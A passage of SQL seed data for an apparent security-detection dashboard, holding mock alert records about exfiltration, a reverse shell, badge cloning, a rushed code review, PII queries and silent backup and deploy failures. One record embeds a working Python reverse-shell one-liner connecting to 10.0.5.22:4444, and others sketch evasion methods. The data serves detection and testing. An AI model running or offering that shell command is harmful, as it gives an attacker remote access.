 '[{"seq": 1, "source": "app_log", "detail": "File transfer completed: Q4_financial_consolidated.7z (500MB) to 45.33.32.156", "time": "02:12:00Z"}, {"seq": 2, "source": "firewall", "detail": "No outbound flow >10MB to 45.33.32.156 in Palo Alto logs (last 6h)", "time": "02:12:05Z"}, {"seq": 3, "source": "netflow", "detail": "No Cisco NetFlow record to 45.33.32.156 in any monitored segment", "time": "02:12:06Z"}, {"seq": 4, "source": "dns_monitor", "detail": "No DNS query resolving to 45.33.32.156 from any internal host", "time": "02:12:08Z"}, {"seq": 5, "source": "dlp_analysis", "detail": "File name pattern matches financial data classification policy", "time": "02:12:10Z"}, {"seq": 6, "source": "threat_assessment", "detail": "CRITICAL: Either data exfiltrated via unmonitored channel OR application log was forged to mask actual destination", "time": "02:12:15Z"}]',
 0, '{}'),

-- Detection 7: Orphan Process
('b1000000-0000-0000-0000-000000000003',
 now() - interval '45 minutes',
 '{"process": {"name": "python3.11", "pid": 31847, "ppid": 1847, "user": "www-data", "cmdline": "python3.11 -c import socket,subprocess;s=socket.socket();s.connect((10.0.5.22,4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())", "host": "web-prod-07", "start_time": "2026-04-08T03:12:00Z"}, "parent_check": {"ppid": 1847, "parent_exists": false, "note": "PID 1847 does not exist in process table. Last known PID 1847 was nginx worker that exited at 02:58Z."}}',
 '{"expected": "Valid process ancestry: systemd -> nginx -> nginx_worker -> python3.11", "actual_ancestry": "BROKEN - parent PID 1847 no longer exists", "session_check": "No interactive session for www-data on web-prod-07", "binary_check": "python3.11 is legitimate binary but launched with reverse shell payload"}',
 'host', 'web-prod-07',
 98, 'critical', 'open',
 '[{"seq": 1, "source": "endpoint_agent", "detail": "Process python3.11 (pid 31847) detected with broken parent chain", "time": "03:12:00Z"}, {"seq": 2, "source": "process_analysis", "detail": "Command line contains reverse shell pattern connecting to 10.0.5.22:4444", "time": "03:12:02Z"}, {"seq": 3, "source": "network_monitor", "detail": "Active TCP connection from web-prod-07 to 10.0.5.22:4444 established", "time": "03:12:03Z"}, {"seq": 4, "source": "session_check", "detail": "No SSH/console session for www-data. Process was NOT spawned from a login session.", "time": "03:12:05Z"}, {"seq": 5, "source": "threat_classification", "detail": "CONFIRMED REVERSE SHELL - Process spawned without valid session ancestry, connects to internal host on suspicious port", "time": "03:12:08Z"}]',
 0, '{}'),

-- Detection 8: Midnight Badge Paradox
('b1000000-0000-0000-0000-000000000016',
 now() - interval '14 hours',
 '{"badge_event": {"user": "dpark", "badge_id": "EMP-2891", "location": "HQ Building B, Floor 5 - R&D Lab", "swipe_time": "2026-04-07T03:14:00Z", "access_granted": true, "access_level": "restricted"}}',
 '{"expected": "Parking garage entry OR lobby door sensor OR elevator from ground floor within 30min", "parking_check": "No vehicle entry for badge EMP-2891 after 18:00 yesterday", "lobby_check": "Main lobby door sensor shows no entry event between 22:00 and 06:00", "elevator_check": "No elevator call from ground floor to floor 5 between 00:00 and 06:00", "camera_check": "Security camera at B-Floor5 entrance shows corridor empty at 03:14 - NO person visible", "conclusion": "Badge was used on Floor 5 but no person entered the building and no person is visible on camera"}',
 'user', 'dpark',
 97, 'critical', 'investigating',
 '[{"seq": 1, "source": "badge_system", "detail": "EMP-2891 (D. Park) accessed R&D Lab at 03:14 AM", "time": "03:14:00Z"}, {"seq": 2, "source": "parking_system", "detail": "No vehicle entry for EMP-2891 since 17:45 previous day", "time": "03:14:05Z"}, {"seq": 3, "source": "lobby_sensors", "detail": "Zero door sensor activations at main lobby between 22:00-06:00", "time": "03:14:06Z"}, {"seq": 4, "source": "elevator_system", "detail": "No elevator trips to Floor 5 between 01:00-05:00", "time": "03:14:07Z"}, {"seq": 5, "source": "cctv_analysis", "detail": "Camera B5-ENTRANCE shows empty corridor at timestamp 03:14:00 - NO human detected by AI vision model", "time": "03:14:10Z"}, {"seq": 6, "source": "badge_forensics", "detail": "Badge reader signal strength suggests proximity read, not long-range replay. Possible cloned badge with relay attack.", "time": "03:14:15Z"}]',
 0,
 '{"building_entry_methods_checked": 4, "all_negative": true, "camera_confirmation": "No person visible", "hypothesis": "Cloned badge with relay/replay attack or insider with alternate physical entry point"}'),

-- Detection 9: Human Speed Violation
('b1000000-0000-0000-0000-000000000013',
 now() - interval '2 hours',
 '{"review_event": {"user": "kpatel", "pull_request": "PR-4872", "repository": "payments-service", "lines_changed": 2847, "files_changed": 34, "action": "approved", "approved_at": "2026-04-08T01:43:12Z"}, "merge_event": {"user": "kpatel", "pull_request": "PR-4872", "merged_at": "2026-04-08T01:43:19Z", "time_to_merge_seconds": 7}}',
 '{"expected": "Minimum review time for 2847 lines: ~24 minutes (at 2 lines/second for expert reviewer)", "actual_review_time_seconds": 7, "lines_per_second": 406, "humanly_possible_max_lps": 5, "impossibility_factor": 81.3, "pr_content": "Changes to payment processing logic, API key rotation, and database migration scripts - HIGH SENSITIVITY changes"}',
 'user', 'kpatel',
 95, 'high', 'open',
 '[{"seq": 1, "source": "github_audit", "detail": "PR-4872 approved by kpatel after viewing for 7 seconds (2847 lines changed)", "time": "01:43:12Z"}, {"seq": 2, "source": "github_audit", "detail": "PR-4872 merged 7 seconds after approval - no other reviewers", "time": "01:43:19Z"}, {"seq": 3, "source": "code_analysis", "detail": "PR modifies payment_processor.py, rotates 3 API keys, adds new DB migration", "time": "01:43:25Z"}, {"seq": 4, "source": "velocity_check", "detail": "406 lines/sec review speed is 81x beyond human capability (max ~5 lps)", "time": "01:43:26Z"}, {"seq": 5, "source": "pr_author_check", "detail": "PR authored by external contractor account ext-jenkins-bot, not a known team member", "time": "01:43:30Z"}]',
 7, '{}'),

-- Detection 10: Shadow Database Query
('b1000000-0000-0000-0000-000000000004',
 now() - interval '2 hours',
 '{"query_event": {"user": "app_readonly", "database": "prod_customers", "query": "SELECT ssn, credit_card_number, date_of_birth FROM customers WHERE account_balance > 100000", "source_ip": "10.0.12.88", "rows_returned": 12847, "timestamp": "2026-04-08T01:48:00Z"}}',
 '{"expected": "Application authentication event (OAuth/JWT) from IP 10.0.12.88 within preceding 1 hour", "searched_sources": ["OAuth token issuance logs", "JWT verification logs", "Application session creation", "API gateway access logs"], "result": "NO application-layer authentication from 10.0.12.88", "host_lookup": "10.0.12.88 is not assigned to any known application server - belongs to developer VLAN", "query_analysis": "Query targets PII fields (SSN, credit card, DOB) with high-value account filter - potential targeted exfiltration"}',
 'service', 'prod_customers',
 94, 'critical', 'investigating',
 '[{"seq": 1, "source": "db_audit", "detail": "Query on customers table from app_readonly@10.0.12.88 - 12,847 rows with PII", "time": "01:48:00Z"}, {"seq": 2, "source": "app_gateway", "detail": "No OAuth/JWT token issued for requests from 10.0.12.88 in last 4 hours", "time": "01:48:05Z"}, {"seq": 3, "source": "network_inventory", "detail": "10.0.12.88 = dev-ws-kpatel (developer workstation, not application server)", "time": "01:48:06Z"}, {"seq": 4, "source": "credential_analysis", "detail": "app_readonly credentials used directly from developer workstation bypassing application tier", "time": "01:48:10Z"}, {"seq": 5, "source": "data_classification", "detail": "Query returns SSN, credit_card_number, date_of_birth - all PCI-DSS restricted fields", "time": "01:48:12Z"}]',
 0, '{}'),

-- Detection 11: Encryption Without Keys
('b1000000-0000-0000-0000-000000000009',
 now() - interval '5 hours',
 '{"storage_event": {"service_identity": "svc-reporting", "bucket": "s3://corp-analytics-prod", "object_key": "exports/2026/Q1/full_export_encrypted.dat", "size_bytes": 2147483648, "entropy_score": 7.94, "encryption_detected": true, "timestamp": "2026-04-07T22:30:00Z"}}',
 '{"expected": "AWS KMS API call (GenerateDataKey, Encrypt, or GetKeyPolicy) from svc-reporting within 1h", "kms_check": "Zero KMS API calls from svc-reporting in last 24 hours", "cloudtrail_check": "Last KMS activity from svc-reporting was 18 days ago (routine key rotation)", "entropy_analysis": "File entropy 7.94/8.0 indicates strong encryption - not compression", "conclusion": "2GB file was encrypted and uploaded without using organizational KMS - suggests hardcoded key or external encryption tool"}',
 'service', 'svc-reporting',
 88, 'high', 'open',
 '[{"seq": 1, "source": "s3_access_log", "detail": "2GB encrypted file uploaded to corp-analytics-prod by svc-reporting", "time": "22:30:00Z"}, {"seq": 2, "source": "entropy_analyzer", "detail": "File entropy: 7.94/8.0 - consistent with AES-256 encryption", "time": "22:30:05Z"}, {"seq": 3, "source": "cloudtrail", "detail": "No KMS API calls from svc-reporting in CloudTrail (last 24h searched)", "time": "22:30:10Z"}, {"seq": 4, "source": "key_management", "detail": "Organization KMS policy requires all encryption via centralized key service", "time": "22:30:12Z"}, {"seq": 5, "source": "anomaly_detection", "detail": "svc-reporting normally uploads unencrypted Parquet files, never encrypted blobs", "time": "22:30:15Z"}]',
 0, '{}'),

-- Detection 12: Invisible Network Hop
('b1000000-0000-0000-0000-000000000018',
 now() - interval '3 hours',
 '{"lateral_movement": {"source_host": "dev-ws-042", "source_ip": "10.0.12.42", "source_subnet": "10.0.12.0/24", "dest_host": "fin-srv-01", "dest_ip": "10.0.50.11", "dest_subnet": "10.0.50.0/24", "protocol": "SMB", "action": "file_access", "files_accessed": ["\\\\fin-srv-01\\payroll\\2026_salary_data.xlsx"], "timestamp": "2026-04-08T00:55:00Z"}}',
 '{"expected": "Firewall log for traffic from 10.0.12.0/24 to 10.0.50.0/24 (these subnets are separated by Palo Alto FW)", "firewall_check": "NO Palo Alto log entry for any traffic between 10.0.12.42 and 10.0.50.11", "switch_check": "NO switch flow log showing MAC of dev-ws-042 communicating with fin-srv-01 subnet", "routing_analysis": "Traffic from 10.0.12.0/24 to 10.0.50.0/24 MUST traverse fw-core-01 - no alternate path exists", "conclusion": "SMB access occurred but left no trace on mandatory network infrastructure - possible direct L2 tunnel or infrastructure compromise"}',
 'host', 'dev-ws-042',
 97, 'critical', 'open',
 '[{"seq": 1, "source": "endpoint_agent", "detail": "SMB connection from dev-ws-042 to \\\\fin-srv-01\\payroll detected", "time": "00:55:00Z"}, {"seq": 2, "source": "palo_alto_fw", "detail": "ZERO log entries for 10.0.12.42 <-> 10.0.50.11 communication (searched last 24h)", "time": "00:55:05Z"}, {"seq": 3, "source": "switch_monitoring", "detail": "No flow records on core switches for this src/dst MAC pair", "time": "00:55:06Z"}, {"seq": 4, "source": "network_topology", "detail": "Verified: only path between subnets is via fw-core-01. No backdoor routes.", "time": "00:55:10Z"}, {"seq": 5, "source": "file_analysis", "detail": "Accessed file: 2026_salary_data.xlsx - classified as HR CONFIDENTIAL", "time": "00:55:12Z"}, {"seq": 6, "source": "hypothesis_engine", "detail": "Possible explanations: (1) Firewall log tampering, (2) L2 GRE tunnel bypassing FW, (3) Physical cable bridging subnets", "time": "00:55:15Z"}]',
 0,
 '{"mandatory_hops": ["fw-core-01"], "hops_with_logs": 0, "topology_validated": true, "alternate_paths": 0, "conclusion": "Traffic traversed network without touching any monitored infrastructure point"}'),

-- Detection 13: USB Data Telekinesis
('b1000000-0000-0000-0000-000000000017',
 now() - interval '48 hours',
 '{"dlp_alert": {"host": "exec-laptop-ceo", "host_id": "WS-EXEC-001", "user": "cmartin", "destination_type": "removable_storage", "drive_letter": "E:", "filename": "board_meeting_Q2_strategy.pptx", "data_classification": "board_confidential", "size_bytes": 45000000, "timestamp": "2026-04-06T11:22:00Z"}}',
 '{"expected": "USB device insertion event from endpoint agent on WS-EXEC-001", "endpoint_check": "NO USB device_connected events on WS-EXEC-001 in last 48 hours", "device_inventory": "No removable storage devices registered for this endpoint", "driver_check": "No USB mass storage driver load events in Windows event log", "conclusion": "DLP detected data written to E: drive (removable) but no USB device was ever connected. Possible virtual drive masquerading as removable or DLP bypass technique."}',
 'user', 'cmartin',
 91, 'critical', 'investigating',
 '[{"seq": 1, "source": "dlp_engine", "detail": "Board-confidential file written to removable drive E: on CEO laptop", "time": "11:22:00Z"}, {"seq": 2, "source": "endpoint_agent", "detail": "No USB device insertion events on WS-EXEC-001 in last 48h", "time": "11:22:05Z"}, {"seq": 3, "source": "windows_events", "detail": "No Event ID 2003 (USB mass storage driver load) in System log", "time": "11:22:06Z"}, {"seq": 4, "source": "device_manager", "detail": "No removable storage in device inventory for WS-EXEC-001", "time": "11:22:08Z"}, {"seq": 5, "source": "forensic_analysis", "detail": "E: drive may be virtual disk mounted via ImDisk or similar tool to evade USB logging", "time": "11:22:15Z"}]',
 0,
 '{"usb_devices_detected": 0, "drive_letter_exists": true, "driver_loads": 0, "hypothesis": "Virtual disk driver used to create removable-type volume without physical USB device"}'),

-- Detection 14: Backup Black Hole
('b1000000-0000-0000-0000-000000000012',
 now() - interval '12 hours',
 '{"backup_event": {"job_name": "prod-db-daily-full", "status": "success", "reported_size_gb": 847, "duration_minutes": 45, "target": "backup-nas-02:/backups/prod-db/", "timestamp": "2026-04-07T14:00:00Z"}}',
 '{"expected": "I/O spike on backup-nas-02 AND new backup file in /backups/prod-db/", "storage_check": "backup-nas-02 I/O baseline: 50 IOPS. During backup window: 52 IOPS (no spike)", "file_check": "No new files in /backups/prod-db/ since 2026-04-06", "disk_usage": "backup-nas-02 disk usage unchanged: 72.3% before and after backup window", "conclusion": "847GB backup reportedly succeeded but generated no I/O on target storage and produced no files"}',
 'host', 'backup-nas-02',
 87, 'high', 'open',
 '[{"seq": 1, "source": "backup_agent", "detail": "Job prod-db-daily-full completed: SUCCESS, 847GB, 45 minutes", "time": "14:00:00Z"}, {"seq": 2, "source": "storage_metrics", "detail": "backup-nas-02 IOPS during backup: 52 (baseline: 50) - NO significant I/O activity", "time": "14:01:00Z"}, {"seq": 3, "source": "file_system", "detail": "No new files in /backups/prod-db/ - newest file is from 2026-04-06", "time": "14:02:00Z"}, {"seq": 4, "source": "disk_monitor", "detail": "Disk usage on backup-nas-02 unchanged at 72.3%", "time": "14:03:00Z"}, {"seq": 5, "source": "risk_assessment", "detail": "If backups are silently failing while reporting success, organization has NO disaster recovery capability", "time": "14:05:00Z"}]',
 0, '{}'),

-- Detection 15: Silent Deployment
('b1000000-0000-0000-0000-000000000011',
 now() - interval '7 hours',
 '{"deploy_event": {"pipeline": "payments-service-deploy", "run_id": "run-28471", "status": "success", "target": "production", "image": "payments-service:v2.14.7", "deployer": "deploy-bot", "timestamp": "2026-04-07T20:15:00Z"}}',
 '{"expected": "Container restart or image pull on production k8s cluster for payments-service within 15min", "k8s_check": "No pod restarts for payments-service deployment in production namespace", "image_check": "Running image is still payments-service:v2.14.6 (not v2.14.7)", "container_runtime": "No container create/start events for payments-service in containerd logs", "conclusion": "CI/CD reports successful production deployment of v2.14.7 but production is still running v2.14.6"}',
 'service', 'payments-service',
 89, 'high', 'investigating',
 '[{"seq": 1, "source": "cicd_pipeline", "detail": "Pipeline payments-service-deploy run-28471 completed: SUCCESS", "time": "20:15:00Z"}, {"seq": 2, "source": "k8s_api", "detail": "No pod restart events for payments-service in production namespace (last 2h)", "time": "20:15:05Z"}, {"seq": 3, "source": "k8s_api", "detail": "Current running image: payments-service:v2.14.6 (NOT v2.14.7)", "time": "20:15:06Z"}, {"seq": 4, "source": "containerd", "detail": "No image pull for payments-service:v2.14.7 on any production node", "time": "20:15:10Z"}, {"seq": 5, "source": "pipeline_analysis", "detail": "Pipeline deploy step may have targeted wrong cluster or namespace - investigating", "time": "20:15:15Z"}]',
 0, '{}');
